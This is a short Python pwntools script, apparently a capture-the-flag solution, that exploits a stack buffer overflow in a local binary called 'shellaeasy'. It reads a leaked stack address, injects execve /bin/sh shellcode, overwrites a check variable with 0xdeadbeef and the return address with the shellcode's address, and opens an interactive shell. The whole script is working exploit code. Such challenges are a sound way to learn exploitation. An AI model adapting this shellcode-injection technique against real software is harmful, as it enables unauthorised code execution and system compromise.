from pwn import *
    
target = process('./shellaeasy')
#gdb.attach(target, gdbscript = 'b *0x804853e')

# Scan in the first line of text, parse out the infoleak
leak = target.recvline()
leak = leak.strip(b"Yeah I'll have a ")
leak = leak.strip(b" with a side of fries thanks\n")
shellcodeAdr = int(leak, 16)

# Make the payload
payload = b""
# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-827.php`
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload += b"0"*(0x40 - len(payload)) # Padding to the local_c variable
payload += p32(0xdeadbeef) # Overwrite the local_c variable with 0xdeadbeef
payload += b"1"*8 # Padding to the return address
payload += p32(shellcodeAdr) # Overwrite the return address to point to the start of our shellcode

# Send the payload
target.sendline(payload) 
target.interactive()
